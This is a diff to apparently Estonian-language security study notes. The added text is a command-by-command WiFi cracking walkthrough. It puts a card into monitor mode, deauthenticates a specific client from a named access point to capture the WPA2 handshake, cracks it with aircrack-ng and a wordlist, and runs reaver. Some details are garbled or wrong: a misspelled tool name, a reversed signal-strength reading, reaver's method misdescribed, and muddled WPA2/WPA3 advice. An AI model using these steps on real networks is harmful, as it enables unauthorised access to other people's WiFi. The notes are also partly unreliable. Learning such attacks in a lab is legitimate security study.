@@ -53,4 +53,21 @@ Loo dokument kuidas fixida kõik kolm rünnakut
 17. Muuda sisse logimise veebilehe nime, et vältida automaatikat (index.php, wp-admin.php)
 
 
-Flipper võib segada elupäästvaid süsteeme (südameaparaadid jne)
+NB! Flipper võib segada elupäästvaid süsteeme (südameaparaadid jne)
+WIFI seadmes väldi settingut WPA2/WPA3. WPA2 on ebaturvaline.
+WIFI kaameraid ei tasu kasutada (laser aitab peaaegu alati)
+
+Monitor mode (Realtek, Intel~, Broadcom~~,Bluedragon~~~ kiibid) on eelduseks järgnevaks ülesandeks + WPA2
+iwconfig
+sudo ifconfig wlan0 down - Katkestame wifi ühenduse
+sudo airmon-ng check kill - tapab ära WIFI peal toimivad teenused (näiteks NetworkManager)
+sudo airmon-ng start wlan0 - lülitame monitor mode sisse (jälgib kõike liiklust)
+iwconfig - kinnita monitor mode. wlan0mon peab olema nähtav
+sudo airoman-ng --band abg wlan0mon - kuulame ja dumpime monitooringu sisu (PWR mida suurem number seda kaugemal seade)
+sudo airodump-ng --bssid E8:DE:27:B0:66:72 --channel 11 wlan0mon --write nimi (scannime APd kindlal kanalil, et näha küljes olevaid kliente ning kirjutame outputi)
+sudo aireplay-ng --deauth 60 -a E8:DE:27:B0:66:72 -c 70:8C:F2:B3:28:D7 wlan0mon (peksame välja kliendi määratud ajaks,et koguda handshake)
+sudo aircrack-ng hack-01.cap -w rockyou.txt (crackime wifi parooli)
+sudo reaver --bssid E8:DE:27:B0:66:72 --channel 11 --interface wlan0mon -vvv -no-associate (nagu eelmine aga teine tool mis crackib ise aga eeldab, et kogume samal ajal handshake)
+sudo airmon-ng stop wlan0mon (enable station mode, disable monitor mode)
+sudo service NetworkManager restart (taasta võrguteenus)
+
